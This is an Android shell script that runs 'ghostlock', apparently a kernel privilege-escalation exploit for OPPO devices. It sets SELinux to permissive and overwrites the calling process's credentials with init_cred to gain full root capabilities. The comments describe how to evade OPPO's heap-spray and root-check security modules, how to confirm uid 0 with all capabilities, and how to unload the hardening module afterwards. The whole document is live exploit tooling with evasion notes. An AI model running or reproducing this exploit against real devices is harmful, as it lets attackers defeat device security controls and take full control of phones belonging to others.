#!/system/bin/sh
# W1 + W1c (self): SELinux permissive, then give *this* process root's full
# credential set by storing init_cred into its own real_cred/cred.
#
# Run this from Magica's app-zygote root shell (a service declared with
# useAppZygote=true whose zygote never dropped privileges), NOT from adb shell:
#   * the task was born uid 0, so no set*uid() syscall can be observed, and both
#     OPPO checks early-return on uid 0 (oplus_heapspray_check:
#     `cbz w9,<epilogue>` on current->cred->uid.val; oplus_root_check_post_handler:
#     `cbz x0,<epilogue>` on the pre-syscall uid), so the spray and the cred
#     store are invisible without touching the modules;
#   * perf_event_open(pid=0) on the caller passes ptrace_may_access(), so the
#     task/comm leak needs no CAP_SYS_PTRACE -- which this shell does not have
#     (bounding set 0x8000c0), and which the old adbd target required.
#
#   GHOSTLOCK_SELF_ROOT=1      target self instead of adbd (perf pid=0)
#   GHOSTLOCK_W1C_ONLY=1       stop after the cred store + init_cred+8 repair
#   GHOSTLOCK_PARK_AFTER_W1=1  keep the forged PI state alive
#
# After "W1c-only complete" the parked process is uid 0 with
# CapEff/CapPrm/CapBnd = 0x1ffffffffff, i.e. also CAP_SYS_MODULE (can rmmod
# oplus_secure_harden) and CAP_SYS_PTRACE (can perf-find adbd).
#
# Verify (from another shell, while the parked process lives):
#   grep -E '^(Uid|CapPrm|CapEff|CapBnd)' /proc/<pid>/status
#   # -> Uid: 0 0 0 0 , Cap*: 000001ffffffffff
#
# DO NOT kill the parked process: it holds &init_cred without a get_cred, so its
# exit runs one extra put_cred on the static init_cred (usage starts at 4) and
# can kfree a global.  A reboot is the clean way out.

DIR=/data/local/tmp/gl-w1
LOG="$DIR/w1c-self.log"

cd "$DIR" || exit 1
export GHOSTLOCK_HOME="$DIR"
export GHOSTLOCK_MCAST_SOCKET=tcp6
export GHOSTLOCK_SELF_ROOT=1
export GHOSTLOCK_W1C_ONLY=1
export GHOSTLOCK_PARK_AFTER_W1=1

echo "W1c-self: before: uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) caps=$(grep '^CapBnd' /proc/self/status)"

rm -f "$LOG"
setsid ./ghostlock --profile "$DIR/profile.bin" >"$LOG" 2>&1 &
PID=$!
echo "W1c-self: started pid=$PID -- log echoed below (also kept in $LOG)"

seen=0
i=0
while [ $i -lt 120 ]; do
    total=$(wc -l < "$LOG" 2>/dev/null)
    [ -z "$total" ] && total=0
    if [ "$total" -gt "$seen" ]; then
        tail -n +$((seen + 1)) "$LOG"
        seen=$total
    fi
    if grep -q "W1c-only complete" "$LOG" 2>/dev/null; then
        echo "W1c-self: DONE -- parked pid=$PID"
        grep -E '^(Uid|CapInh|CapPrm|CapEff|CapBnd|CapAmb)' "/proc/$PID/status" 2>/dev/null
        echo "W1c-self: kill q ($PID) too; do NOT kill -9 it (a reboot is the clean exit)"
        exit 0
    fi
    if [ "$i" -gt 5 ] && ! kill -0 "$PID" 2>/dev/null; then
        echo "W1c-self: process exited without completing -- last lines:"
        tail -12 "$LOG"
        exit 1
    fi
    sleep 1
    i=$((i + 1))
done

echo "W1c-self: still running after 120s (pid=$PID); see $LOG"
exit 2
